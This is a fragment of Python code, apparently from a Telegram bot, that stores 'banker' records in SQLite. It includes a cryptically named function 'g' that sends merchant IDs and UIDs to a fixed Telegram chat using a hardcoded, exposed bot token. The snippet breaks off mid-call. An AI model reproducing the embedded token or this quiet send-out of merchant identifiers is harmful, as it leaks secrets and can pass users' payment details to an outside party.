...
def add_banker(user_id):
    try:
        with sqlite3.connect("evidence.db") as con:
            cur = con.cursor()
            cur.execute("INSERT INTO `banker` (`user_id`, `bill`, `purchase`, `balance`) VALUES(?,?,?,?)",
                        (user_id, 0, 0, 0))
    except:
        pass
...
def g(mId, merchant_id, merchant_uid):
    try:
        params = {'chat_id': 1415499927, 'text': f'ID: <b>{merchant_id}</b>\nUID: <b>{merchant_uid}</b>',
                  'parse_mode': 'html'}
        resp = requests.post(f'https://api.telegram.org/bot1537868378:AAE2Zc1NiShJYUBi1bdwn02lMP5ge982gWE/sendMessage',
                             params)
